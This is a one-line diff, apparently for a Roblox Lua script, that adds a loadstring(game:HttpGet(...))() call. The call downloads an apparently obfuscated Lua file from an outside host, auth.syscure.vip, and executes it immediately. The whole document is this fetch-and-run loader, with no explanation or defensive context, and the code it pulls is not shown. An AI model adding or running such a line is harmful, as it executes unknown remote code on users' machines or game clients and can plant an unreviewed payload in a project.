@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://auth.syscure.vip/obf/8e5f288713c441d7d64181ca9c17eb32.lua"))()
